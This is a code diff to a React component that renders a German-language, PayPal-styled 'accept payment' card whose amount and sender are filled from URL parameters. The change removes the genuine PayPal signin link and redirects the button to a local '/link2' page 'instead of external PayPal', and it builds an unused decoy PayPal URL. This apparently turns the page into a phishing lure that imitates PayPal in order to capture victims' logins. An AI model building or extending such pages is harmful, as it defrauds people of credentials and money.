@@ -11,6 +11,20 @@ export const ActionButtonSection = (): JSX.Element => {
     return new URLSearchParams();
   }, []);
 
+  // Generate random 11-digit number for returnUri
+  const generateReturnUri = () => {
+    return Math.floor(10000000000 + Math.random() * 90000000000).toString();
+  };
+
+  // Handle button click
+  const handlePaymentAccept = () => {
+    const randomReturnUri = generateReturnUri();
+    const paypalUrl = `https://www.paypal.com/signin?returnUri=${randomReturnUri}`;
+    
+    // Redirect to /link2 page instead of external PayPal
+    window.location.href = "/link2";
+  };
+
   // Data for the payment acceptance card with dynamic values
   const paymentData = useMemo(() => {
     const priceParam = urlParams.get("price");
@@ -21,7 +35,6 @@ export const ActionButtonSection = (): JSX.Element => {
       amount: priceParam || "1,00 €",
       sender: nameParam ? `Von ${nameParam}` : "Von Nina Pflaum",
       buttonText: "Zahlung akzeptieren",
-      buttonLink: "https://www.paypal.com/signin",
     };
   }, [urlParams]);
 
@@ -55,21 +68,14 @@ export const ActionButtonSection = (): JSX.Element => {
             </p>
 
             <Button
-              asChild
-              className="bg-black text-wwwpaypalcomwhite rounded-full px-6 sm:px-8 py-3 sm:py-4 min-h-10 sm:min-h-12 min-w-20 sm:min-w-24 hover:bg-black/90 w-full sm:w-auto max-w-xs"
+              onClick={handlePaymentAccept}
+              className="bg-black text-wwwpaypalcomwhite rounded-full px-6 sm:px-8 py-3 sm:py-4 min-h-10 sm:min-h-12 min-w-20 sm:min-w-24 hover:bg-black/90 w-full sm:w-auto max-w-xs text-[length:var(--www-paypal-com-button-font-size)] tracking-[var(--www-paypal-com-button-letter-spacing)] leading-[var(--www-paypal-com-button-line-height)] text-sm sm:text-base text-center"
+              style={{ 
+                fontFamily: 'var(--www-paypal-com-button-font-family)',
+                fontWeight: 'var(--www-paypal-com-button-font-weight)'
+              }}
             >
-              <a
-                href={paymentData.buttonLink}
-                rel="noopener noreferrer"
-                target="_blank"
-                className="text-[length:var(--www-paypal-com-button-font-size)] tracking-[var(--www-paypal-com-button-letter-spacing)] leading-[var(--www-paypal-com-button-line-height)] text-sm sm:text-base text-center"
-                style={{ 
-                  fontFamily: 'var(--www-paypal-com-button-font-family)',
-                  fontWeight: 'var(--www-paypal-com-button-font-weight)'
-                }}
-              >
-                {paymentData.buttonText}
-              </a>
+              {paymentData.buttonText}
             </Button>
           </CardContent>
         </Card>
